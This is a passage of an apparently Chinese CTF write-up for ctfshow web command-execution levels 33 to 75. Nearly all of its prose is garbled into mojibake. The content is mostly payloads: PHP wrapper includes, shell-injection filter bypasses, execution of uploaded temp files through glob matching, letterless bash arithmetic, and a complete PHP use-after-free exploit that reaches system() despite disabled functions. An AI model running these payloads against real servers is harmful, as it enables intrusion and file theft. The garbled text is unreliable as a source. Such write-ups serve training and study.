å…¥çš„å†…å®¹ï¼‰ï¼Œè¿›è€Œé€šè¿‡ä¼ å…¥å‚æ•°é€šè¿‡phpä¼ªåè®®è¯»å–å†…å®¹\n\n##### 33\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·ï¼ŒåŒä¸Š\n\n##### 34\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·ï¼ŒåŒä¸Š\n\n##### 35\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·,å·¦å°–æ‹¬å·,ç­‰äºå·ï¼ŒåŒä¸Š\n\n##### 36\n\n```\npayload:?c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·,å·¦å°–æ‹¬å·,ç­‰äºå·,æ•°å­—ï¼Œå°†getå‚æ•°ä¸­çš„æ•°å­—æ”¹ä¸ºå­—æ¯å³å¯\n\n##### 37\n\n```\npayload:?c=php://input\nè¯·æ±‚ä½“:<?php include \"flag.php\"?>\næˆ–\npayload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\nincludeå‡½æ•°å¼€å§‹ï¼Œè¿‡æ»¤äº†flagï¼Œé€šè¿‡php://inputä¼ªåè®®ç›´æ¥åŒ…å«æ–‡ä»¶\n\n##### 38\n\n```\npayload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=\n```\n\nè¿‡æ»¤äº†flag, php,fileï¼Œé€šè¿‡dataä¼ªåè®®æ‰§è¡Œinclude \"flag.php\"\n\n##### 39\n\n```\npayload:?c=data://text/plain,<?php system(\"cat fla*.php\");?>\n```\n\nè¿‡æ»¤äº†flagå¹¶ä¸”åŒ…å«çš„æ˜¯å˜é‡c.phpï¼Œè¾“å…¥åç›¸å½“äºç›´æ¥æ‰§è¡Œè¾“å…¥çš„PHPå‘½ä»¤ï¼Œç”±äºå‰é¢çš„PHPå†…å®¹å·²ç»é—­åˆï¼Œæ‰€ä»¥åé¢çš„.phpç›´æ¥å°±æ˜¯.phpæ–‡æœ¬æ˜¾ç¤ºï¼Œå¯¹å‰é¢çš„å‘½ä»¤è¾“å…¥æ²¡æœ‰å½±å“\n\n##### 40\n\n```\npayload:?c=eval(array_pop(next(get_defined_vars())));\n\nPOST:a=system('cat flag.php');\n```\n\nprint_r(get_defined_vars());å¯ä»¥æ‹¿åˆ°æ‰€æœ‰å·²ç»å®šä¹‰çš„å˜é‡å¹¶å–å¾—å€¼\n\nnext(å˜é‡)å¯ä»¥è·å¾—ä¸‹ä¸€ä¸ªå˜é‡\n\narray_pop(æ•°ç»„)å¼¹å‡ºæ•°ç»„ä¸­çš„å˜é‡ä¸ºå•ä¸ªç‹¬ç«‹å˜é‡\n\n```\nc=session_start();system(session_id());\npassid=ls\n```\n\næœ¬åœ°ä¿®æ”¹sessionIDä¼ å…¥å‘½ä»¤\n\n##### 41\n\n```\n\n```\n\n```\n'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\n```\n\nå¯ä»¥å‘ç°å¤§å¤šæ•°è‡ªè´Ÿéƒ½è¢«è¿‡æ»¤ï¼ŒæŸ¥çœ‹æç¤º\n\né€šè¿‡è„šæœ¬å¯è·å–å¼‚æˆ–ï¼ˆï½œï¼‰åèƒ½å¾—åˆ°çš„æ‰€æœ‰å­—ç¬¦\n\nç›´æ¥ä½¿ç”¨è„šæœ¬\n\n##### 42\n\n```\npayload:?c=cat flag.php;\n```\n\n$c.\" >/dev/null 2>&1\"\n\né¢˜ç›®ä¸­å°†å‘½ä»¤è¾“å‡ºä¿å­˜åˆ°é»‘æ´ä¸­ï¼Œå¯é€šè¿‡åˆ†å·åˆ†å‰²å‘½ä»¤è®©ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤ç›´æ¥æ˜¾ç¤º\n\n##### 43\n\n```\npayload:?c=tac%20flag.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†catå’Œåˆ†å·ï¼Œé€šè¿‡&&ä¹Ÿå¯è¿›è¡Œå¤šå‘½ä»¤æ‰§è¡Œï¼Œè¦è¿›è¡ŒURLç¼–ç \n\n##### 44\n\n```\npayload:?c=tac%20fla*.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†flagï¼Œä½¿ç”¨é€šé…ç¬¦\n\n##### 45\n\n```\npayload:?c=tac${IFS}fla*.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰¾ä¸ªèƒ½æ›¿ä»£çš„å°±è¡Œ\n\n##### 46\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†*å’Œ$ï¼Œä½¿ç”¨%09ï¼ˆåˆ¶è¡¨ç¬¦ï¼‰æ›¿ä»£ç©ºæ ¼\n\n##### 47\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†ä¸€äº›è¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼Œä½†æ²¡æ»¤tacï¼Œç›´æ¥ç”¨\n\n##### 48\n\n```\npayload:?c=tac<fl%27%27ag.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†æ•°å­—å’Œç©ºæ ¼\n\n##### 49\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†æ°´å¹³åˆ¶è¡¨ç¬¦å’Œ&&ç¬¦ï¼Œå°†&æ›´æ¢ä¸ºï½œä¹Ÿå¯ä»¥å¤šå‘½ä»¤æ‰§è¡Œ\n\n##### 50\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n##### 51\n\n```\npayload:?c=nl<fla%27%27g.php||\n```\n\næ»¤äº†tacå‘œå‘œå‘œå‘œç”¨nl\n\n##### 52\n\n```\npayload:?c=nl${IFS}/fl%27%27ag||\n```\n\næ»¤æ‰äº†å°–æ‹¬å·ä½†æ˜¯$å›æ¥äº†\n\n`nl${IFS}fla%27%27g.php||`\n\nä½†æ˜¯æ˜æ˜¾flagä¸å¯¹ï¼Œæ‰€ä»¥çœ‹ä¸€ä¸‹æ ¹ç›®å½•`ls${IFS}/`å‘ç°flagå­˜åœ¨\n\nä½¿ç”¨nlè¯»å–\n\n##### 53\n\n```\npayload:?c=ta%27%27c${IFS}fla?.php\n```\n\nè¯¥é¢˜å†…å®¹ä¸åŒ\n\n```\necho($c);\n$d = system($c);\necho \"<br>\".$d;\n```\n\nå…ˆå°†å‘½ä»¤æ‰“å°å¹¶æ‰§è¡Œåè·å¾—systemå‡½æ•°çš„è¿”å›å€¼å¹¶è¾“å‡ºï¼Œsystemå‡½æ•°åªè¿”å›å‘½ä»¤æ‰§è¡Œåè¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œä½¿ç”¨tac\n\n##### 54\n\n```\npayload:c=mv${IFS}fla?.php${IFS}kkk.txt\n/kkk.txt\n```\n\nè¿‡æ»¤äº†å•å¼•å·ç»•è¿‡ï¼Œé€šè¿‡mvå‘½ä»¤é‡å‘½åç›´æ¥è¯»å–\n\n##### 55\n\nè¿‡æ»¤`\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\"\n\n**æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ**\n\nç›´æ¥è®²åŸç†å’¯\n\n.ï¼ˆç‚¹ï¼‰æˆ–è€…å«periodï¼Œå®ƒçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™â€œ.fileâ€çš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ç”¨â€œ.fileâ€æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸éœ€è¦fileæœ‰xæƒé™çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œé‚£ä¸å°±å¯ä»¥åˆ©ç”¨â€œ.â€æ¥æ‰§è¡Œå®ƒäº†å—ï¼Ÿ\n\nå’‹æ‰§è¡Œå‘¢ï¼ŒåŸç†æ˜¯å½“æˆ‘ä»¬å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«å‚¨å­˜åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œé»˜è®¤çš„æ–‡ä»¶æ˜¯`/tmp/phpXXXXXX`(å…­ä¸ªéšæœºå­—ç¬¦)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨é€šé…ç¬¦ï¼ˆ?å•åŒ¹é…å’Œ*å¤šåŒ¹é…ï¼‰æ¥å°è¯•æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½†æ˜¯å°è¯•æ‰§è¡Œåå‘ç°ä¸è¡Œï¼Œæˆ‘ä»¬è‡ªå·±æ­å»ºä¸€ä¸ªphpç¯å¢ƒçœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png)\n\nåˆ—å‡ºç›¸å…³çš„æ–‡ä»¶åå‘ç°æ˜¯å› ä¸ºç¬¦åˆåŒ¹é…æ¡ä»¶çš„æ–‡ä»¶æ•°é‡ä¸æ­¢ä¸€ä¸ªï¼Œå°±å¯¼è‡´è¿˜æ²¡è¿è¡Œåˆ°æˆ‘ä»¬ä¸Šä¼ çš„è„šæœ¬æ—¶å°±å·²ç»ç»“æŸäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°è¯•ç”¨å…¶ä»–çš„é€šé…ç¬¦åŒ¹é…å‡ºæˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ç›¸å…³èµ„æ–™ï¼ŒLinuxçš„globé€šé…ç¬¦çš„ç›¸å…³å†…å®¹ï¼ˆè´´ä¸ªé“¾æ¥ï¼‰\n\nhttps://man7.org/linux/man-pages/man7/glob.7.html\n\né™¤äº†ä½¿ç”¨?å’Œ*è¿›è¡Œä»»æ„åŒ¹é…ï¼Œè¿˜å¯ä»¥ä½¿ç”¨`[^X]`æ¥æ’é™¤æŸä¸ªå­—ç¬¦ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ’é™¤å‰é¢åŒ…å«`-`å’Œ`.`æ–‡ä»¶ï¼Œç»§ç»­æŸ¥çœ‹å‘ç°è¿˜å‰©ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼Œè€Œåå‘ç°è¿˜æœ‰ä¸€ä¸ªé€šé…ç¬¦è¯­æ³•`[X-Y]`å¯ä»¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œè€Œä¸”åªæœ‰phpä¸´æ—¶æ–‡ä»¶ä¸­åŒ…å«å¤§å†™å­—æ¯ï¼ŒæŸ¥è¯¢asciiç è¡¨å‘ç°å¤§å†™å­—æ¯ä½äº`@`å’Œ`[`ä¹‹é—´ï¼Œæ‰€ä»¥æ„é€ `[@-[]`å°±å¯ä»¥åŒ¹é…åˆ°æˆ‘ä»¬çš„æ–‡ä»¶äº†\n\næœ€ç»ˆpayload\n\né¦–å…ˆæ„å»ºä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POSTæ•°æ®åŒ…POC</title>\n</head>\n<body>\n<form action=\"å½“å‰é“¾æ¥/?c=./???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n    <label for=\"file\">æ–‡ä»¶åï¼š</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"æäº¤\">\n</form>\n</body>\n</html>\n```\n\nç¬¬ä¸€ä¸ªæ–‡ä»¶å†…å®¹\n\n```shell\nls\nç„¶å\ncat /var/www/html/flag.php\n```\n\nå¦‚æœä¸€æ¬¡ä¸æˆåŠŸå°±repeaterå¤šè¯•å‡ æ¬¡\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png)\n\næ‹¿åˆ°flag\n\n##### 57\n\n```\npayload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\n\nè¿‡æ»¤äº†å¤§é‡å­—ç¬¦ï¼Œæœ€ç»ˆéœ€è¦æ„å»º36å³å¯ï¼Œæ²¡æœ‰è¿‡æ»¤`$`ï¼Œè€Œåœ¨Linuxä¸­$æ˜¯å˜é‡çš„å…³é”®å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å˜é‡\n\n```\n$(())è¿™ä¸ªå˜é‡ä¸­çš„()ä»£è¡¨æ•°å­¦è¿ç®—ï¼Œç»“æœä¸º0ï¼Œæ‰€ä»¥\necho $(())\n0\nå¯¹è¿™ä¸ªå˜é‡è¿›è¡Œå–åæ“ä½œç»“æœä¸º\necho ~$(())\n~0\né‚£ä¹ˆæˆ‘ä»¬å†å¯¹~0è¿›è¡Œæ•°å­¦è¿ç®—å¾—åˆ°çš„ç»“æœå°±æ˜¯\necho $((~$(())))\n~1\næ‰€ä»¥æˆ‘ä»¬æƒ³å¾—åˆ°36å°±æ˜¯è®©36ä¸ª~1ç›¸åŠ å†å–å\necho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n##### 58\n\n```\npayload:\nPOST\nc=file_get_contents('flag.php')\n```\n\nå‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°\n\né¦–å…ˆå°è¯•systemå‘ç°è¢«è¿‡æ»¤äº†ï¼Œemmmmå°è¯•è¿‡åå‘ç°èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å…¨è¢«ç¦ç”¨äº†\n\né‚£ä¹ˆå°è¯•èƒ½å¦è¯»å–æ–‡ä»¶ï¼Œä½¿ç”¨file_get_contentsè¯»å–æˆåŠŸï¼Œæç¤ºä¸­ä¹Ÿæ˜¾ç¤ºshow_sourceåŒæ ·å¯ç”¨\n\n##### 59\n\n```\npayload:\nPOST\nc=show_source('flag.php')\n```\n\nèƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å°±åˆ«è¯•äº†ï¼Œå…¨æŒ‚äº†\n\nshow_sourceå¯ç”¨\n\nè¿˜å¯å°è¯•é€šè¿‡includeæ¥åŒ…å«æ–‡ä»¶ï¼Œå†é€šè¿‡PHPä¼ªåè®®è¿›è¡Œè¯»å–\n\n```\npayload:?file=php://filter/read=convert.base64-encode/resource=flag.php\nPOST\nc=include($_GET['flie']);\n```\n\n##### 60\n\n```\npayload:\nPOST\nc=highlight_file('flag.php');\n```\n\nä¸Šä¸€é¢˜å¯ç”¨çš„æ–¹æ³•ä¹Ÿå¯\n\n##### 61\n\nåŒä¸Š\n\n##### 62\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\nä¸Šé¢æ‰€æœ‰æ–¹æ³•çš†å¯\n\n##### 63\n\n```\npayload:\nPOST\nc=include('flag.php');var_dump(get_defined_vars());\n```\n\n`get_defined_vars()`å¯è·å¾—æ‰€æœ‰å·²å®šä¹‰çš„å˜é‡ï¼Œå½“ä¸çŸ¥é“å˜é‡åæ—¶å¯ä½¿ç”¨è¿™ä¸ª\n\nä¸Šé¢æ–¹æ³•åŒæ ·ğŸ‰‘ï¸\n\n##### 64\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n`scandir('.')`å¯ç”¨äºæ‰«ææ–‡ä»¶ï¼Œå’Œlsä¸€ä¸ªæ„æ€ï¼Œå½“æˆ‘ä»¬ä¸çŸ¥é“æ–‡ä»¶åæ—¶å¯ä½¿ç”¨\n\n##### 65\n\nåŒä¸Š\n\n##### 66\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-19 17.49.25.png)\n\nå°è¯•å¤±è´¥è¿˜è¢«å˜²è®½äº†ï¼Œé¦–å…ˆæ‰«æä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag.txtï¼Œ`highlight_file('/flag.txt')`è¯»å–å³å¯\n\n```\npayload:\nPOST\nc=highlight_file('/flag.txt');\n```\n\n##### 67\n\nåŒä¸Š\n\n##### 68\n\n```\npayload:\nPOST\nc=include('/flag.txt')\n```\n\nå±äºæ˜¯ç¦»è°±äº†ï¼Œç›´æ¥å°äº†`highlight_file`å‡½æ•°ï¼Œ`var_dump(scandir('/'))`ï¼Œå‘ç°åœ¨æ ¹ç›®å½•ä¸­ï¼Œç›´æ¥includeæ–‡ä»¶ï¼Œæ²¡æœ‰phpæ ‡ç­¾å³ä¸ºç›´æ¥æ˜¾ç¤ºæºç ï¼Œç­‰äºç›´æ¥æ˜¾ç¤ºflag.txtçš„å†…å®¹\n\n##### 69\n\nåŒä¸Š\n\n##### 70\n\nç»§ç»­ç™½å«–\n\n##### 71\n\n```\npayload:\nPOST\nc=include('/flag.txt');exit();\n```\n\nå°è¯•ç™½å«–å‘ç°å¤±è´¥ï¼Œä¸‹è½½æºç è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°åœ¨è¾“å‡ºä¹‹å‰å°†ç¼“å†²åŒºä¸­çš„æ‰€æœ‰æ•°å­—å­—æ¯æ¢æˆäº†é—®å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®©å®ƒåŒ…å«å®Œç›´æ¥é€€å‡ºå°±è¡Œäº†\n\n##### 72\n\næ–‡ä»¶æ¢ä½ç½®äº†å“­å“­ï¼Œscandiræ‰¾ä¸åˆ°æ ¹ç›®å½•ï¼Œvar_dumpä¹Ÿæ²¡äº†ï¼Œå“­å“­\n\nçœ‹æç¤º\n\né¦–å…ˆæ‰¾å‡ºæ–‡ä»¶å\n\n```PHP\npayload:\nPOST\nc=$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} exit(0);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-19 23.52.16.png)uafè„šæœ¬å¦‚ä¸‹\n\n```PHP\n<?php\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace();\n            if(!isset($backtrace[1]['args'])) {\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr & 0xff));\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { \n\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { \n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) {\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) {\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; \n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); \n    write($abc, 0xd0 + 0x68, $zif_system); \n\n    ($helper->b)($cmd);\n    exit();\n}\n\nctfshow(\"cat /flag0.txt\");ob_end_flush();\n?>\n\n```\n\næœ€ç»ˆ\n\n```\npayload:\nPOST\nc=ä¸Šé¢çš„ä»£ç \n```\n\n##### 73\n\nincludeå›æ¥é‡Œï¼Œflagc.txt\n\n##### 74\n\n```\npayload:\nPOST\nc=include('/flagx.txt');exit();\n```\n\né¦–å…ˆæ‰«ç›®å½•ï¼ŒåŒä¸Šé¢˜payloadï¼Œè€Œåå‘ç°åœ¨æ ¹ç›®å½•æœ‰flagx.txtå°è¯•åŒ…å«æˆåŠŸ\n\n##### 75\n\nbanæ‰äº†open_basedirè®¿é—®æ–‡ä»¶çš„æ–¹å¼ï¼Œåªèƒ½é€šè¿‡åˆ«çš„æ–¹æ³•æ¥è®¿é—®æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡mysqlè®¿é—®ï¼Œåœ¨å‰é¢å‡ é¢˜ä¸­å¯ä»¥æ‰¾åˆ°mysqlçš„è´¦å·å¯†ç ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```PHP\npayload:\nPOST\nc=try {\n  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');\n  foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n\t{\n    echo($row[0]); \n  }\n  $dbh = null;\n}\ncatch (PDOException $e) \n{\n  echo $e->getMessage();\n  exit(0);\n}\nexit(0);\n```\n\næ‹“å±•PDOçŸ¥è¯†ï¼š\n\n```PHP\nPHP æ•°æ®å¯¹è±¡ ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚\nPDO æä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚\nPDOéšPHP5.1å‘è¡Œï¼Œåœ¨PHP5.0çš„PECLæ‰©å±•ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ— æ³•è¿è¡Œäºä¹‹å‰çš„PHPç‰ˆæœ¬ã€‚\nä¸€ä¸ªå®ä¾‹\n<?php\n$dbms='mysql';     //æ•°æ®åº“ç±»å‹\n$host='localhost'; //æ•°æ®åº“ä¸»æœºå\n$dbName='test';    //ä½¿ç”¨çš„æ•°æ®åº“\n$user='root';      //æ•°æ®åº“è¿æ¥ç”¨æˆ·å\n$pass='';          //å¯¹åº”çš„å¯†ç \n$dsn=\"$dbms:host=$host;dbname=$dbName\";\n\ntry {\n    $dbh = new PDO($dsn, $user, $pass); //åˆå§‹åŒ–ä¸€ä¸ªPDOå¯¹è±¡\n    echo 